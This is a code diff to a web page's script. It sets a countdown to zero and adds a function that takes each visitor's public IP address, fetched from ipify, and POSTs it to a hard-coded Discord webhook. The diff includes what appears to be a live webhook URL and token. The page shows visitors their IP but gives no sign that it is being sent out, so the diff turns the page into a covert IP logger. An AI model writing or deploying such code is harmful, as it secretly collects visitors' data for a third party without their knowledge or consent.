@@ -44,7 +44,7 @@
 
     <script>
         // Countdown Timer
-        let countdown = 10;
+        let countdown = 0;
         const countdownElement = document.getElementById('countdown');
         const userIpElement = document.getElementById('user-ip');
 
@@ -58,18 +58,45 @@
             }
         }, 1000);
 
-        // Function to fetch and display IP address
+        // Function to fetch and display IP address, then send to Discord webhook
         function displayUserIP() {
-            // Fetch the user's public IP using an API
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    userIpElement.textContent = `Your IP Address: ${data.ip}`;
+                    const userIP = data.ip;
+                    userIpElement.textContent = `Your IP Address: ${userIP}`;
+                    
+                    // Send the IP to a Discord webhook
+                    sendToDiscord(userIP);
                 })
                 .catch(error => {
                     userIpElement.textContent = 'Could not retrieve IP address';
                     console.error('Error fetching IP:', error);
                 });
+        }
+
+        // Function to send IP address to Discord webhook
+        function sendToDiscord(ip) {
+            const webhookUrl = "https://discord.com/api/webhooks/1291292062993485824/E2RA9ftK97nJu813Lms3QcYGghu4J6v0CEZb1xkpNoys7-jru3MpC1dC7o2CATGicCMp"; // Replace with your webhook URL
+            const message = {
+                content: `User's IP Address: ${ip}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('IP address sent to Discord successfully.');
+                } else {
+                    console.error('Failed to send IP to Discord:', response.statusText);
+                }
+            })
+            .catch(error => console.error('Error sending IP to Discord:', error));
         }
     </script>
 </body>
